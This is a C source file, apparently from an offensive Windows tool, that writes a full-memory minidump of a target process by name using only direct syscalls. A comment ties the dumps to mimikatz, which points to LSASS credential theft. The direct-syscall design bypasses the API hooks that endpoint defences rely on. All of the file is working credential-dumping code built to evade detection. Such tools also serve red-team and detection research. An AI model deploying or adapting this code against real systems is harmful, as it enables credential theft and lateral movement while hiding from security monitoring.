#include <Windows.h>
#include <minidumpapiset.h>

#include "ListUtils.h"
#include "RemotePEBBrowser.h"
#include "StringUtils.h"
#include "SyscallProcessUtils.h"
#include "SW2_Syscalls.h"
#include "Undoc.h"

#include "ProcessDumpDirectSyscalls.h"

VOID writeAtRVA(DUMP_CONTEXT* dumpContext, ULONG32 rva, const PVOID data, unsigned size) {
    memcpy(GetRVA((ULONG_PTR) dumpContext->BaseAddress, rva), data, size);
}

BOOL appendToDump(DUMP_CONTEXT* dumpContext, const PVOID data, DWORD size) {
    ULONG32 newRVA = dumpContext->RVA + size;
    if (newRVA < dumpContext->RVA) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: exceeds the 32-bit address space (int overflow)\n"));
        return FALSE;
    }
    else if (dumpContext->DumpMaxSize < newRVA) {
        while(dumpContext->DumpMaxSize < newRVA){
            dumpContext->DumpMaxSize *= 2;
        }
        PVOID ptr = realloc(dumpContext->BaseAddress, dumpContext->DumpMaxSize);
        if (!ptr) {
            _tprintf_or_not(TEXT("[-] Syscall process dump failed: reallocation failed\n"));
            return FALSE;
        }
        dumpContext->BaseAddress = ptr;
    }

    writeAtRVA(dumpContext, dumpContext->RVA, data, size);
    dumpContext->RVA = newRVA;
    return TRUE;
    
}

BOOL writeMiniDumpHeader(DUMP_CONTEXT* dumpContext) {
    MINIDUMP_HEADER header = { 0 };
    header.Signature = dumpContext->Signature;
    header.Version = dumpContext->Version | (((DWORD)dumpContext->ImplementationVersion)<<16);
    // Only SystemInfoStream, ModuleListStream and Memory64ListStream streams.
    header.NumberOfStreams = 3;
    header.NumberOfStreams = (header.NumberOfStreams + 3) & ~3; // round up to next multiple of 4, https://github.com/w1u0u1/minidump/blob/main/minidump/minidump.c ?
    header.StreamDirectoryRva = sizeof(MINIDUMP_HEADER);
    header.CheckSum = 0;
    header.Reserved = 0;
    header.TimeDateStamp = 0;
    header.Flags = MiniDumpWithFullMemory;

    if (!appendToDump(dumpContext, &header, sizeof(MINIDUMP_HEADER))) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: failed to write dump header\n"));
        return STATUS_UNSUCCESSFUL;
    }

    return STATUS_SUCCES;
}

DWORD writeMiniDumpDirectories(DUMP_CONTEXT* dumpContext) {
    DWORD nbDirectories = 0;

    MINIDUMP_DIRECTORY systemInfoDirectory = { 0 };
    systemInfoDirectory.StreamType = SystemInfoStream;
    systemInfoDirectory.Location.DataSize = 0;
    systemInfoDirectory.Location.Rva = 0;
    if (!appendToDump(dumpContext, &systemInfoDirectory, sizeof(systemInfoDirectory))) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write SystemInfoStream directory\n"));
        return STATUS_UNSUCCESSFUL;
    }
    nbDirectories++;

    MINIDUMP_DIRECTORY moduleListDirectory = { 0 };
    moduleListDirectory.StreamType = ModuleListStream;
    moduleListDirectory.Location.DataSize = 0;
    moduleListDirectory.Location.Rva = 0;
    if (!appendToDump(dumpContext, &moduleListDirectory, sizeof(moduleListDirectory)))
    {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write ModuleListStream directory\n"));
        return STATUS_UNSUCCESSFUL;
    }
    nbDirectories++;

    MINIDUMP_DIRECTORY memory64ListDumpDirectory = { 0 };
    memory64ListDumpDirectory.StreamType = Memory64ListStream;
    memory64ListDumpDirectory.Location.DataSize = 0;
    memory64ListDumpDirectory.Location.Rva = 0;
    if (!appendToDump(dumpContext, &memory64ListDumpDirectory, sizeof(memory64ListDumpDirectory))) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write Memory64ListStream directory\n"));
        return STATUS_UNSUCCESSFUL;
    }
    nbDirectories++;

    while (nbDirectories & 3) {
        MINIDUMP_DIRECTORY unusedDirectory = { 0 };
        unusedDirectory.StreamType = UnusedStream;
        unusedDirectory.Location.DataSize = 0;
        unusedDirectory.Location.Rva = 0;

        if (!appendToDump(dumpContext, &unusedDirectory, sizeof(unusedDirectory))) {
            _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write unusedDirectory directory\n"));
            return STATUS_UNSUCCESSFUL;
        }
        nbDirectories++;
    }

    return STATUS_SUCCES;
}

DWORD writeMiniDumpSystemInfoStream(DUMP_CONTEXT* dumpContext) {
    MINIDUMP_SYSTEM_INFO dumpSystemInfo = { 0 };

    // read the PEB.
#if _WIN64
    PEB64 peb = *(PPEB64) __readgsqword(0x60);
#else
    PEB peb = *(PPEB) __readfsdword(0x30);
#endif
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);

    dumpSystemInfo.ProcessorLevel = sysInfo.wProcessorLevel;
    dumpSystemInfo.ProcessorRevision = sysInfo.wProcessorRevision;
    dumpSystemInfo.NumberOfProcessors = (BYTE)sysInfo.dwNumberOfProcessors;
    dumpSystemInfo.ProductType = VER_NT_WORKSTATION;

    dumpSystemInfo.MajorVersion = peb.OSMajorVersion;
    dumpSystemInfo.MinorVersion = peb.OSMinorVersion;
    dumpSystemInfo.BuildNumber = peb.OSBuildNumber;
    dumpSystemInfo.PlatformId = peb.OSPlatformId;
    dumpSystemInfo.ProcessorArchitecture = PROCESSOR_ARCHITECTURE;
    dumpSystemInfo.CSDVersionRva = 0;
    dumpSystemInfo.SuiteMask = VER_SUITE_SINGLEUSERTS;
    dumpSystemInfo.Reserved2 = 0;
    dumpSystemInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0] = 0;
    dumpSystemInfo.Cpu.OtherCpuInfo.ProcessorFeatures[1] = 0;

    for (DWORD i = 0; i < sizeof(dumpSystemInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0]) * 8; i++) {
        if (IsProcessorFeaturePresent(i)) {
            dumpSystemInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0] |= 1LL << i;
        }
    }

    RVA streamRVA = dumpContext->RVA;
    ULONG32 streamSize = sizeof(dumpSystemInfo);
    if (!appendToDump(dumpContext, &dumpSystemInfo, streamSize)) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write the SystemInfoStream (stream rva)\n"));
        return STATUS_UNSUCCESSFUL;
    }

    // Append CSDVersion string
#if _WIN64
    ULONG32 CSDVersionLength = peb.CSDVersion.uOrDummyAlign.u.Length;
#else
    ULONG32 CSDVersionLength = peb.CSDVersion.Length;
#endif
    ULONG32 CSDVersionBufferLength = CSDVersionLength + sizeof(WCHAR);
    PMINIDUMP_STRING CSDVersion = calloc(1, sizeof(MINIDUMP_STRING) + CSDVersionBufferLength);
    if (!CSDVersion) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't allocate CSDVersion string\n"));
        return STATUS_UNSUCCESSFUL;
    }
    CSDVersion->Length = CSDVersionLength;
    memcpy(CSDVersion->Buffer, peb.CSDVersion.Buffer, CSDVersionBufferLength);
    RVA CSDVersionRVA = dumpContext->RVA;
    appendToDump(dumpContext, CSDVersion, sizeof(MINIDUMP_STRING) + CSDVersionBufferLength);
    
    // write our length in the MiniDumpSystemInfo directory
    writeAtRVA(dumpContext, sizeof(MINIDUMP_HEADER) + offsetof(MINIDUMP_DIRECTORY, Location.DataSize), &streamSize, sizeof(streamSize));

    // write our RVA in the MiniDumpSystemInfo directory
    writeAtRVA(dumpContext, sizeof(MINIDUMP_HEADER) + offsetof(MINIDUMP_DIRECTORY, Location.Rva), &streamRVA, sizeof(streamRVA));

    // write the CSDVersion RVA in the SystemInfoStream
    writeAtRVA(dumpContext, streamRVA + offsetof(MINIDUMP_SYSTEM_INFO, CSDVersionRva), &CSDVersionRVA, sizeof(CSDVersionRVA));

    return STATUS_SUCCES;
}

DWORD writeMiniDumpModuleListStream(DUMP_CONTEXT* dumpContext, PMODULE_INFO pmoduleList) {
    PMODULE_INFO currentModule = pmoduleList;

    ULONG32 modulesCount = 0;

    // Write modules dll metadata (length & path).
    while (currentModule) {
        modulesCount = modulesCount + 1;

        currentModule->nameRVA = dumpContext->RVA;

        // Write the module fullname length.
        ULONG32 DllFullNameLength = (ULONG32)(wcsnlen((WCHAR*) &currentModule->dllName, sizeof(currentModule->dllName)) + 1) * sizeof(WCHAR);
        if (!appendToDump(dumpContext, &DllFullNameLength, 4)) {
            _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write the ModuleListStream (write of module DllFullName length failed)\n"));
            return STATUS_UNSUCCESSFUL;
        }

        // Write the module fullname length.
        if (!appendToDump(dumpContext, currentModule->dllName, DllFullNameLength)) {
            _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write the ModuleListStream (write of module DllFullName failed)\n"));
            return STATUS_UNSUCCESSFUL;
        }
        currentModule = currentModule->next;
    }

    // Write the number of modules.
    RVA streamRVA = dumpContext->RVA;
    if (!appendToDump(dumpContext, &modulesCount, 4)) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write the ModuleListStream (write of number of modules failed)\n"));
        return STATUS_UNSUCCESSFUL;
    }

    // Write the modules data.
    currentModule = pmoduleList;
    while (currentModule) {
        MINIDUMP_MODULE module = { 0 };
        module.BaseOfImage = (ULONG_PTR)currentModule->dllBase;
        module.SizeOfImage = currentModule->ImageSize;
        module.CheckSum = currentModule->checkSum;
        module.TimeDateStamp = currentModule->timeDateStamp;
        module.ModuleNameRva = currentModule->nameRVA;
        module.VersionInfo.dwSignature = 0;
        module.VersionInfo.dwStrucVersion = 0;
        module.VersionInfo.dwFileVersionMS = 0;
        module.VersionInfo.dwFileVersionLS = 0;
        module.VersionInfo.dwProductVersionMS = 0;
        module.VersionInfo.dwProductVersionLS = 0;
        module.VersionInfo.dwFileFlagsMask = 0;
        module.VersionInfo.dwFileFlags = 0;
        module.VersionInfo.dwFileOS = 0;
        module.VersionInfo.dwFileType = 0;
        module.VersionInfo.dwFileSubtype = 0;
        module.VersionInfo.dwFileDateMS = 0;
        module.VersionInfo.dwFileDateLS = 0;
        module.CvRecord.DataSize = 0;
        module.CvRecord.Rva = 0;
        module.MiscRecord.DataSize = 0;
        module.MiscRecord.Rva = 0;
        module.Reserved0 = 0;
        module.Reserved1 = 0;

        
        if (!appendToDump(dumpContext, &module, sizeof(module))) {
            _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write the ModuleListStream (write of module bytes failed)\n"));
            return STATUS_UNSUCCESSFUL;
        }
        currentModule = currentModule->next;
    }

    // Write the total length in the ModuleListStream directory.
    // header + 1 directory + streamType
    ULONG32 streamSize = sizeof(modulesCount) + modulesCount * sizeof(MINIDUMP_MODULE);
    writeAtRVA(dumpContext, sizeof(MINIDUMP_HEADER) + sizeof(MINIDUMP_DIRECTORY) + offsetof(MINIDUMP_DIRECTORY, Location.DataSize), &streamSize, sizeof(streamSize));

    // Write our RVA in the ModuleListStream directory.
    // header + 1 directory + streamType + Location.DataSize
    writeAtRVA(dumpContext, sizeof(MINIDUMP_HEADER) + sizeof(MINIDUMP_DIRECTORY) + offsetof(MINIDUMP_DIRECTORY, Location.Rva), &streamRVA, sizeof(streamRVA));

    return STATUS_SUCCES;
}

DWORD writeMiniDumpMemory64ListStream(DUMP_CONTEXT* dumpContext, PMEMORY_PAGE_INFO pmemoryPages) {
    RVA streamRVA = dumpContext->RVA;

    PMINIDUMP_MEMORY64_LIST memory64List = calloc(1, sizeof(MINIDUMP_MEMORY64_LIST));
    if (!memory64List) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't alloc the Memory64ListStream structure\n"));
        return STATUS_UNSUCCESSFUL;
    }

    // Count the number of memory ranges.
    PMEMORY_PAGE_INFO currentMemoryPage = pmemoryPages;
    ULONG32 memoryPagesCount = 0;
    while (currentMemoryPage) {
        memoryPagesCount++;
        currentMemoryPage = currentMemoryPage->next;
    }
    memory64List->NumberOfMemoryRanges = memoryPagesCount;

    // Extend the structure to host all ranges
    ULONG32 streamSize = sizeof(MINIDUMP_MEMORY64_LIST) + memoryPagesCount * sizeof(MINIDUMP_MEMORY_DESCRIPTOR64);
    PMINIDUMP_MEMORY64_LIST tmp = realloc(memory64List, streamSize);
    if (!tmp) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't realloc the Memory64ListStream structure\n"));
        return STATUS_UNSUCCESSFUL;
    }
    memory64List = tmp;

    // Compute the rva of the actual memory content
    RVA64 baseRVA = (RVA64)streamRVA + (RVA64)streamSize;
    memory64List->BaseRva = baseRVA;

    // Compute the start and size of each memory Page.
    currentMemoryPage = pmemoryPages;
    SIZE_T indexMemoryRange = 0;
    while (currentMemoryPage) {
        memory64List->MemoryRanges[indexMemoryRange].StartOfMemoryRange = currentMemoryPage->startOfMemoryPage;
        memory64List->MemoryRanges[indexMemoryRange].DataSize = currentMemoryPage->dataSize;
        currentMemoryPage = currentMemoryPage->next;
        indexMemoryRange++;
    }

    //Write the actual stream
    appendToDump(dumpContext, memory64List, streamSize);
    free(memory64List);
    memory64List = NULL;

    // Write our length in the Memory64ListStream directory.
    // header + 2 directories + streamType.
    writeAtRVA(dumpContext, sizeof(MINIDUMP_HEADER) + sizeof(MINIDUMP_DIRECTORY) * 2 + offsetof(MINIDUMP_DIRECTORY, Location.DataSize), &streamSize, sizeof(streamSize));

    // write our RVA in the Memory64ListStream directory
    // header + 2 directories + streamType + Location.DataSize
    writeAtRVA(dumpContext, sizeof(MINIDUMP_HEADER) + sizeof(MINIDUMP_DIRECTORY) * 2 + offsetof(MINIDUMP_DIRECTORY, Location.Rva), &streamRVA, sizeof(streamRVA));
    
    // dump all the selected memory Pages.
    currentMemoryPage = pmemoryPages;
    while (currentMemoryPage) {
        PBYTE buffer = calloc(currentMemoryPage->dataSize, 1);
        if (!buffer) {
            _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write the Memory64ListStream stream (failed to allocate memory for memory Page)\n"));
            return STATUS_UNSUCCESSFUL;
        }

        NTSTATUS status = NtReadVirtualMemory(dumpContext->hProcess, (PVOID)(ULONG_PTR)currentMemoryPage->startOfMemoryPage, buffer, currentMemoryPage->dataSize, NULL);
        // once in a while, a Page fails with STATUS_PARTIAL_COPY, not relevant for mimikatz
        if (!NT_SUCCESS(status) && status != STATUS_PARTIAL_COPY) {
            _tprintf_or_not(TEXT("[-] Failed to read memory Page: startOfMemoryPage: 0x%p, dataSize: 0x%llx, state: 0x%lx, protect: 0x%lx, type: 0x%lx, NtReadVirtualMemory status: 0x%lx. Continuing anyways...\n"),
                                 (PVOID)(ULONG_PTR)currentMemoryPage->startOfMemoryPage,
                                 currentMemoryPage->dataSize,
                                 currentMemoryPage->state,
                                 currentMemoryPage->protect,
                                 currentMemoryPage->type,
                                 status);
        }
        if (MAXDWORD < currentMemoryPage->dataSize) {
            _tprintf_or_not(TEXT("[-] Syscall process dump failed: memory range too big ! Aboring\n"));
            return STATUS_UNSUCCESSFUL;
        }
        if (!appendToDump(dumpContext, buffer, (DWORD)currentMemoryPage->dataSize)) {
            _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't write the Memory64ListStream stream (failed to write memory Page)\n"));
            return STATUS_UNSUCCESSFUL;
        }

        // Free memory Page (overwrite it first, just in case).
        memset(buffer, 0, currentMemoryPage->dataSize);
        free(buffer);
        buffer = NULL;
        
        currentMemoryPage = currentMemoryPage->next;
    }

    return STATUS_SUCCES;
}

DWORD SandMiniDumpWriteDump(TCHAR* targetProcessName, WCHAR* dumpFilePath) {
    DWORD status = STATUS_UNSUCCESSFUL;
    DWORD targetProcessPID = 0;
    
    PMODULE_INFO pmoduleList = NULL;
    PMEMORY_PAGE_INFO pmemoryPages = NULL;

    HANDLE hDumpFile = NULL;
    OBJECT_ATTRIBUTES ObjectAttributesDumpFile = { 0 };
    IO_STATUS_BLOCK IoStatusBlock = { 0 };
    LARGE_INTEGER AllocationSize = { 0 };

    HANDLE htargetProcess = NULL;
    OBJECT_ATTRIBUTES ObjectAttributesProcess = { 0 };

    status = SandFindProcessPidByName(targetProcessName, &targetProcessPID);

    if (!NT_SUCCESS(status) || targetProcessPID == 0) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't find target %s process PID\n"), targetProcessName);
        goto cleanup;
    }

    WCHAR FilePath[MAX_PATH] = { 0 };
    const WCHAR prefix[] = L"\\??\\";
    memcpy_s(FilePath, sizeof(FilePath), prefix, sizeof(prefix));
    UNICODE_STRING dumpFilePathAsUnicodeStr = { 0 };
    wcscat_s(FilePath, _countof(FilePath), dumpFilePath);

    getUnicodeStringFromTCHAR(&dumpFilePathAsUnicodeStr, FilePath);
    
    // Create the dump file to validate that the output path is correct beforing accessing the process to dump memory.
    InitializeObjectAttributes(&ObjectAttributesDumpFile, &dumpFilePathAsUnicodeStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
    status = NtCreateFile(&hDumpFile, FILE_GENERIC_WRITE, &ObjectAttributesDumpFile, &IoStatusBlock, &AllocationSize, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    if (status == STATUS_OBJECT_PATH_NOT_FOUND || status == STATUS_OBJECT_NAME_INVALID) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: the dump file %s path is not valid\n"), FilePath);
        goto cleanup;
    }
    else if (!NT_SUCCESS(status)) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't create empty dump file (NtCreateFile error 0x%x).\n"), status);
        goto cleanup;
    }

    // Open an handle to the process to dump.
    InitializeObjectAttributes(&ObjectAttributesProcess, NULL, 0, NULL, NULL);
    CLIENT_ID clientId = { 0 };
    clientId.ProcessId = UlongToHandle(targetProcessPID);

    status = NtOpenProcess(&htargetProcess, PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &ObjectAttributesProcess, &clientId);
    if (status == STATUS_ACCESS_DENIED) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: access denied error while trying to get an handle on the target process (NtOpenProcesserror 0x%x).\n"), status);
        goto cleanup;
    }
    else if (!NT_SUCCESS(status)) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't get an handle to the target process (NtOpenProcess 0x%x).\n"), status);
        goto cleanup;
    }

    // Allocate memory to write the mini dump.
    SIZE_T dumpSz = sizeof(MINIDUMP_HEADER); // arbitrary, the allocation size grows at each appendToDump
    PVOID dumpBaseAddr = calloc(dumpSz, 1);
    if (!dumpBaseAddr) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: couldn't allocate memory for dump file.\n"));
        goto cleanup;
    }

    DUMP_CONTEXT dumpContext = { 0 };
    dumpContext.Signature = MINIDUMP_SIGNATURE;
    dumpContext.Version = MINIDUMP_VERSION; // | implementation_version << 16
    dumpContext.hProcess = htargetProcess;
    dumpContext.BaseAddress = dumpBaseAddr;
    dumpContext.RVA = 0;
    dumpContext.DumpMaxSize = dumpSz;

    pmoduleList = getModulesInLdrByInMemoryOrder(htargetProcess);
    if (!pmoduleList) {
        goto cleanup;
    }

    pmemoryPages = getMemoryPagesInfo(dumpContext.hProcess, TRUE);
    if (!pmemoryPages) {
        goto cleanup;
    }

    status = writeMiniDumpHeader(&dumpContext);
    if (!NT_SUCCESS(status)) {
        goto cleanup;
    }

    status = writeMiniDumpDirectories(&dumpContext);
    if (!NT_SUCCESS(status)) {
        goto cleanup;
    }

    status = writeMiniDumpSystemInfoStream(&dumpContext);
    if (!NT_SUCCESS(status)) {
        goto cleanup;
    }

    status = writeMiniDumpModuleListStream(&dumpContext, pmoduleList);
    if (!NT_SUCCESS(status)) {
        goto cleanup;
    }

    status = writeMiniDumpMemory64ListStream(&dumpContext, pmemoryPages);
    if (!NT_SUCCESS(status)) {
        goto cleanup;
    }

    status = NtWriteFile(hDumpFile, NULL, NULL, NULL, &IoStatusBlock, dumpContext.BaseAddress, dumpContext.RVA, NULL, NULL);
    if (!NT_SUCCESS(status)) {
        _tprintf_or_not(TEXT("[-] Syscall process dump failed: failed to write dump to file (NtWriteFile 0x%x).\n"), status);
        goto cleanup;
    }

    freeLinkedList(pmoduleList);
    freeLinkedList(pmemoryPages);
    NtClose(htargetProcess);
    NtClose(hDumpFile);

    _tprintf_or_not(TEXT("[+] %s sucessfully dumped with direct syscalls only to: %s\n"), targetProcessName, dumpFilePath);

    return STATUS_SUCCES;

cleanup:
    if (htargetProcess) {
        NtClose(htargetProcess);
    }
    
    if (hDumpFile) {
        NtClose(hDumpFile);
    }

    if (pmoduleList) {
        freeLinkedList(pmoduleList);
    }

    if (pmemoryPages) {
        freeLinkedList(pmemoryPages);
    }

    return STATUS_UNSUCCESSFUL;
}

DWORD SandMiniDumpWriteDumpFromThread(PVOID* args) {
    return SandMiniDumpWriteDump(args[0], args[1]);
}